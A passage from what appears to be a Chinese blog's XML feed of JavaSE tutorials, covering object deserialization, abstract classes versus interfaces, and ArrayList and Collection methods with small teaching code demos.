class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><span class="hljs-comment">//        Student stu = new Student(&quot;Bob&quot;, 21);//构造学生对象</span><br><span class="hljs-comment">//        //使用序列化（串行化）将学生对象写入到文件中</span><br><span class="hljs-comment">//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./myTest.txt&quot;));</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //写学生对象</span><br><span class="hljs-comment">//        oos.writeObject(stu);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        oos.close();//关闭流</span><br><br>        System.out.println(<span class="hljs-string">&quot;-------------------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//使用反序列化（反串行化）将文件中的学生对象加载到内存中来</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>));<br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">newStu</span> <span class="hljs-operator">=</span> (Student) ois.readObject();<br><br>        System.out.println(newStu);<br><br>        ois.close();<span class="hljs-comment">//关闭流并释放资源</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>IO流</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---抽象类</title>
    <link href="/2020/05/10/JavaSe%E5%9F%BA%E7%A1%80---%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
    <url>/2020/05/10/JavaSe%E5%9F%BA%E7%A1%80---%E6%8A%BD%E8%B1%A1%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><ul><li><p>（1）当一个类的某个操作方法没法具体实现时，这个操作可以定义为抽象方法。抽象方法使用abstract修饰，只有方法的声明部分，没有方法体。</p></li><li><p>（2）含有抽象方法的类必须定义为抽象类。</p></li><li><p>（3）使用abstract修饰的方法为抽象方法，只有方法声明没有方法体。</p></li><li><p>（4）含有抽象方法的类必须定义为抽象类，但是抽象类中不一定抽象方法。</p></li><li><p>（5）抽象类是一种引用数据类型，可以定义变量，但是抽象类不能实例化对象。</p></li><li><p>（6）抽象类肯定含有构造方法，子类创建对象时调用子类构造方法，子类构造方法体执行前会先执行父类的构造方法。</p></li><li><p>（7）abstract与final不能同时使用。</p></li><li><p>Java抽象类与接口的异同点</p><ul><li>相同点</li></ul><pre><code class="hljs">-   1.都可以定义抽象方法-   2.都不能实例化对象-   3.接口/抽象类的抽象方法都需要被重写-   4.接口/抽象类中都可以定义 public static final字段, public static静态方法</code></pre><ul><li>不同点</li></ul><pre><code class="hljs">-   1.意义不同    -   抽象类对类进行更高层级的抽象，接口是对功能的封装-   2.定义方式不同    -   抽象类使用 abstract class定义，接口使用interface定义-   3.内容不同    -   抽象类中除了可以定义抽象方法外, 还可以定义实例变量/实例方法/静态变量/静态方法,构造方法等普通类所有的成员。    -   接口中除了抽象方法外, 还可以定义public static final字段, public static方法,public default方法 。    -   抽象类有构造方法, 接口没有构造方法; 接口中可以使用default修饰方法，抽象类不能使用default修饰方法。-   4.使用方式不同    -   抽象类一般作为父类存在, 需要子类通过extends继承。接口需要通过类implements实现。-   5.继承    -   类只支持单继承, 接口支持多继承-   6.应用场景不同    -   如果仅仅是为了扩展类的功能,优先选择接口;    -   如果除了功能外,还需要保存不同的数据,选择抽象类,抽象类中的抽象方法,需要在子类中重写,抽象类可以约束所有的子类都具有某个功能</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>抽象类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---集合</title>
    <link href="/2020/05/10/JavaSe%E5%9F%BA%E7%A1%80---%E9%9B%86%E5%90%88/"/>
    <url>/2020/05/10/JavaSe%E5%9F%BA%E7%A1%80---%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<p><a name="70d6a007"></a></p><h2 id="1-集合"><a href="#1-集合" class="headerlink" title="1 - 集合"></a>1 - 集合</h2><p><a name="e2427894"></a></p><h3 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 - 概述"></a>1.1 - 概述</h3><ul><li>在内存中申请一块空间用来存储数据，在Java中集合实际上就是替换掉定长数组的一种引用数据类型<br>  <a name="yfl7X"></a></li></ul><h3 id="1-2-集合与数组的区别"><a href="#1-2-集合与数组的区别" class="headerlink" title="1.2 - 集合与数组的区别"></a>1.2 - 集合与数组的区别</h3><ul><li><strong>长度区别</strong><ul><li>数组长度固定，定义长了会造成内存空间的浪费，定义短了内存空间不够用</li><li>集合大小可变，用多少拿多少空间</li></ul></li><li><strong>内容区别</strong><ul><li>数组可以存储基本数据类型和引用数据类型</li><li>集合只能存储引用数据类型</li></ul></li><li><strong>元素区别</strong><ul><li>数组只能存储同一种类型的数据</li><li>集合中可以存储不同类型的数据（一般情况下也只存同一种类型的数据）</li></ul></li><li><strong>集合结构</strong><ul><li>单列集合  <strong>Collection</strong> <ul><li><strong>List</strong>可以重复：<em>ArrayList&#x2F;LinkedList</em></li><li><strong>Se</strong>t不可重复:<em>HashSet&#x2F;TreeSet</em></li></ul></li></ul></li><li>双列集合 <strong>Map</strong>：<em>HashMap&#x2F;TreeMap</em></li></ul><blockquote><p>接口：粗体    实现类：斜体</p></blockquote><p><a name="0fabf3cb"></a></p><h3 id="1-3-ArrayList"><a href="#1-3-ArrayList" class="headerlink" title="1.3 - ArrayList"></a>1.3 - ArrayList</h3><p><code>ArrayList&lt;E&gt;</code>原型</p><ul><li>ArrayList是一个List接口的实现类</li><li>底层就是一个可以调整大小的数组实现的</li><li><code>&lt;E&gt;</code>：是一种特殊的数据类型 （引用数据类型） - 泛型 <ul><li><code>ArrayList&lt;String&gt; 或者 ArrayList&lt;Student&gt; 或者 ArrayList&lt;Integer&gt;</code><br>  <a name="43c8c596"></a></li></ul></li></ul><h3 id="1-4-ArrayList构造和添加方法"><a href="#1-4-ArrayList构造和添加方法" class="headerlink" title="1.4 - ArrayList构造和添加方法"></a>1.4 - ArrayList构造和添加方法</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>public ArrayList&lt;E&gt;()</code></td><td>创建一个空的集合</td></tr><tr><td><code>public boolean add(E e)</code></td><td>将指定的元素追加到集合的末尾</td></tr><tr><td><code>public void add(int index , E e)</code></td><td>在集合的指定位置插入元素</td></tr><tr><td><code>public void addAll(E object)</code></td><td>用于将指定集合中所有元素添加到当前集合中</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  ArrayList集合的创建和添加</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<span class="hljs-comment">//创建空集合</span><br><br>        <span class="hljs-comment">//添加元素到list集合中，成功则返回true</span><br>        System.out.println(list.add(<span class="hljs-string">&quot;刘德华&quot;</span>));<br>        System.out.println(list.add(<span class="hljs-string">&quot;张学友&quot;</span>));<br>        System.out.println(list.add(<span class="hljs-string">&quot;郭富城&quot;</span>));<br>        System.out.println(list.add(<span class="hljs-string">&quot;黎明&quot;</span>));<br><br>        <span class="hljs-comment">//指定位置插入元素</span><br>        list.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;周润发&quot;</span>);<br><span class="hljs-comment">//        list.add(12,&quot;谭咏麟&quot;);//使用索引插入元素时，索引的最大值不能大于集合中元素个数</span><br><br>        <span class="hljs-comment">//向指定集合中添加另一个集合中的全部元素</span><br>        ArrayList&lt;String&gt; newList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        newList.add(<span class="hljs-string">&quot;宋小宝&quot;</span>);<br>        newList.add(<span class="hljs-string">&quot;小沈阳&quot;</span>);<br>        newList.add(<span class="hljs-string">&quot;刘能儿&quot;</span>);<br>        newList.add(<span class="hljs-string">&quot;赵四儿&quot;</span>);<br><br>        <span class="hljs-comment">//将参数集合中全部元素添加到调用集合中</span><br><span class="hljs-comment">//        list.addAll(newList);//追加的方式</span><br>        list.addAll(<span class="hljs-number">3</span>,newList);<span class="hljs-comment">//指定位置插入元素</span><br><br>        <span class="hljs-comment">//查看集合</span><br>        System.out.println(list);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="0dd77d36"></a></p><h3 id="1-5-ArrayList集合的常用方法"><a href="#1-5-ArrayList集合的常用方法" class="headerlink" title="1.5 - ArrayList集合的常用方法"></a>1.5 - ArrayList集合的常用方法</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>public boolean remove(Object o)</code></td><td>删除指定的元素，成功则返回true</td></tr><tr><td><code>public E remove(int index)</code></td><td>删除指定索引位置的元素，返回被删除的元素</td></tr><tr><td><code>public E set(int index , E e)</code></td><td>修改指定索引对应的元素，返回被修改前的元素</td></tr><tr><td><code>public E get(int index)</code></td><td>获取指定索引位置的元素</td></tr><tr><td><code>public int size()</code></td><td>返回集合的元素个数</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  集合中常用方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建集合</span><br>        ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//追加方式添加元素</span><br>        list.add(<span class="hljs-string">&quot;东邪&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;西毒&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;南帝&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;北丐&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;中神通&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;操作前：&quot;</span> + list);<br><br>        <span class="hljs-comment">//通过元素的名称进行删除</span><br>        System.out.println(list.remove(<span class="hljs-string">&quot;西毒&quot;</span>));<br>        <span class="hljs-comment">//通过索引位置删除元素</span><br>        System.out.println(list.remove(<span class="hljs-number">3</span>));<br><br>        <span class="hljs-comment">//修改指定元素，并将被删除的元素进行返回</span><br>        System.out.println(list.set(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;西毒&quot;</span>));<br><br>        <span class="hljs-comment">//获取指定索引位置的元素</span><br>        System.out.println(list.get(<span class="hljs-number">2</span>));<br><br>        System.out.println(<span class="hljs-string">&quot;操作后：&quot;</span> + list);<br><br>        <span class="hljs-comment">//集合的遍历，普通for循环，foreach，迭代器，Stream</span><br>        <span class="hljs-comment">//方法一</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list.size(); i++) &#123;<br>            System.out.print(list.get(i) + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>        System.out.println();<br><br>        <span class="hljs-comment">//方法二</span><br>        <span class="hljs-keyword">for</span> (String str : list) &#123;<br>            System.out.print(str + <span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>        System.out.println();<br><br>        <span class="hljs-comment">//方法三</span><br>        Iterator&lt;String&gt; it = list.iterator();<span class="hljs-comment">//创建迭代器对象</span><br>        <span class="hljs-keyword">while</span> (it.hasNext())&#123;<span class="hljs-comment">//判断下一个位置是否有元素，有元素则返回true</span><br>            System.out.print(it.next() + <span class="hljs-string">&quot;\t&quot;</span>);<span class="hljs-comment">//取出下一个位置的元素，并将游标移动到当前位置</span><br>        &#125;<br>        System.out.println();<br><br>        <span class="hljs-comment">//方法四</span><br>        list.stream().forEach(System.out::println);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="fbf2da13"></a></p><h3 id="1-6-ArrayList存储学生对象并格式化输出"><a href="#1-6-ArrayList存储学生对象并格式化输出" class="headerlink" title="1.6 - ArrayList存储学生对象并格式化输出"></a>1.6 - ArrayList存储学生对象并格式化输出</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  格式化输出 printf</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        runPrintf();</span><br>        ArrayList&lt;Student&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<span class="hljs-comment">//创建集合用来存储学生对象</span><br>        stuInit(list);<span class="hljs-comment">//初始化化集合，赋值</span><br>        showStuList(list);<span class="hljs-comment">//显示学生信息</span><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showStuList</span><span class="hljs-params">(ArrayList&lt;Student&gt; list)</span> &#123;<br><span class="hljs-comment">//        System.out.printf(&quot;┌ ┬ ┐├ ┼ ┤└ ┴ ┘ ─ │&quot;);</span><br>        System.out.printf(<span class="hljs-string">&quot;┌────────┬────┐\n&quot;</span>);<br>        System.out.printf(<span class="hljs-string">&quot;│%-8s│%-4s│\n&quot;</span>,<span class="hljs-string">&quot;NAME&quot;</span>,<span class="hljs-string">&quot;AGE&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Student stu : list) &#123;<span class="hljs-comment">//遍历学生对象</span><br>            System.out.printf(<span class="hljs-string">&quot;├────────┼────┤\n&quot;</span>);<br>            System.out.printf(<span class="hljs-string">&quot;│%-8s│%-4d│\n&quot;</span>,stu.getName(),stu.getAge());<br>        &#125;<br>        System.out.printf(<span class="hljs-string">&quot;└────────┴────┘\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stuInit</span><span class="hljs-params">(ArrayList&lt;Student&gt; list)</span> &#123;<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>,<span class="hljs-number">18</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Jack&quot;</span>,<span class="hljs-number">22</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Jim&quot;</span>,<span class="hljs-number">26</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Lucy&quot;</span>,<span class="hljs-number">31</span>));<br>        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Tom&quot;</span>,<span class="hljs-number">25</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 格式化输出基本使用</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runPrintf</span><span class="hljs-params">()</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;整数类型：%d\n&quot;</span>,<span class="hljs-number">9527</span>);<br>        System.out.printf(<span class="hljs-string">&quot;float类型：%f\n&quot;</span>,<span class="hljs-number">3.14f</span>);<br>        System.out.printf(<span class="hljs-string">&quot;字符串类型：%s\n&quot;</span>,<span class="hljs-string">&quot;String&quot;</span>);<br>        System.out.printf(<span class="hljs-string">&quot;我的姓名是%s,年龄是%d,身高是%f\n&quot;</span>,<span class="hljs-string">&quot;Andy&quot;</span>,<span class="hljs-number">21</span>,<span class="hljs-number">1.78f</span>);<br><br>        <span class="hljs-comment">//限定输出宽度</span><br>        System.out.printf(<span class="hljs-string">&quot;***********%s***********\n&quot;</span>,<span class="hljs-string">&quot;Hello&quot;</span>);<br>        System.out.printf(<span class="hljs-string">&quot;***********%10s***********\n&quot;</span>,<span class="hljs-string">&quot;Hello&quot;</span>);<br>        System.out.printf(<span class="hljs-string">&quot;***********%-10s***********\n&quot;</span>,<span class="hljs-string">&quot;Hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>双色球 - 数组版</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  双色球 - 数组版</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">ran</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<span class="hljs-comment">//创建随机类对象</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">blueBall</span> <span class="hljs-operator">=</span> ran.nextInt(<span class="hljs-number">16</span>) + <span class="hljs-number">1</span>;<span class="hljs-comment">//生成蓝球</span><br><br>        <span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">6</span>];<span class="hljs-comment">//创建容器，存放红球</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<span class="hljs-comment">//通过循环生成6个随机数，用来控制循环次数的</span><br>            <span class="hljs-comment">//红球的范围是1 ~ 33之间随机选一个，但是不能重复</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> ran.nextInt(<span class="hljs-number">33</span>) + <span class="hljs-number">1</span>; <span class="hljs-comment">//每循环一次生成一个红球</span><br>            arr[i] = n;<span class="hljs-comment">//将生成的红球存放到数组中</span><br><br>            <span class="hljs-comment">//做红球去重的处理</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>                <span class="hljs-keyword">if</span>(n == arr[j])&#123;<span class="hljs-comment">//用当前生成的红球与数组中存储的红球做对比</span><br>                    i--;<span class="hljs-comment">//外循环需要重新再摇一次红球</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br><span class="hljs-comment">//        Arrays.sort();</span><br>        <span class="hljs-comment">//冒泡排序法</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<span class="hljs-comment">//控制最多循环比较的次数</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr.length - <span class="hljs-number">1</span> - i; j++) &#123;<span class="hljs-comment">//控制前后两个数比较的次数</span><br>                <span class="hljs-keyword">if</span>(arr[j] &gt; arr[j + <span class="hljs-number">1</span>])&#123;<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> arr[j];<br>                    arr[j] = arr[j +<span class="hljs-number">1</span>];<br>                    arr[j + <span class="hljs-number">1</span>] = t;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;红球：&quot;</span> + Arrays.toString(arr) + <span class="hljs-string">&quot; | 蓝球[&quot;</span> + blueBall + <span class="hljs-string">&quot;]&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="bd931175"></a></p><h2 id="2-Collection"><a href="#2-Collection" class="headerlink" title="2 - Collection"></a>2 - Collection</h2><p><a name="4a7e68b4"></a></p><h3 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 - 概述"></a>2.1 - 概述</h3><blockquote><p>单列集合的顶层接口，既然是接口就不能直接实例化，需要通过实现类。</p></blockquote><p><a name="06c62f9f"></a></p><h3 id="2-2-Collection集合常用方法"><a href="#2-2-Collection集合常用方法" class="headerlink" title="2.2 - Collection集合常用方法"></a>2.2 - Collection集合常用方法</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>boolean add(E e)</code></td><td>添加元素到集合的末尾，成功则返回true</td></tr><tr><td><code>boolean remove(Object o)</code></td><td>删除指定元素，成功则返回true</td></tr><tr><td><code>void clear()</code></td><td>清空集合</td></tr><tr><td><code>boolean contains(Object o)</code></td><td>判断参数在集合中是否存在，存储则返回true</td></tr><tr><td><code>boolean isEmpty()</code></td><td>判断集合是否为空，空则返回true</td></tr><tr><td><code>int size()</code></td><td>获取集合中元素个数</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Collection;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Collection 常用方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//多态，父类的引用执行子类的对象形成多态</span><br>        Collection&lt;String&gt; con = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        con.add(<span class="hljs-string">&quot;东邪&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;西毒&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;南帝&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;北丐&quot;</span>);<br>        con.add(<span class="hljs-string">&quot;中神通&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;操作前：&quot;</span> + con);<br><br>        <span class="hljs-comment">//删除元素</span><br>        System.out.println(con.remove(<span class="hljs-string">&quot;中神通&quot;</span>));<br><br>        <span class="hljs-comment">//判断参数是否包含在调用对象中</span><br>        System.out.println(con.contains(<span 